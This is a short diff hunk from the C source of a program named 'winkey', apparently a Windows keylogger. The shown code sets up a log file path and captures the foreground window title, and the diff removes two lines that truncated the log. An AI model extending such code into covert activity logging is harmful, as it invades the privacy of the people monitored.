@@ -10,8 +10,6 @@ int			main(int ac, char *av[])
 		return (1);
 	memcpy(g_winkey.path, av[0], strlen(av[0]) + 1);
 	memcpy(strrchr(g_winkey.path, '\\') + 1, LOG_FILE, strlen(LOG_FILE) + 1);
-	fopen_s(&g_winkey.stream, g_winkey.path, "w" );
-	fclose(g_winkey.stream);
 	memset(g_winkey.window_title, 0, sizeof(g_winkey.window_title));
 	memset(g_winkey.window_prev, 0, sizeof(g_winkey.window_prev));
 	GetWindowText(GetForegroundWindow(), g_winkey.window_title, sizeof(g_winkey.window_title));
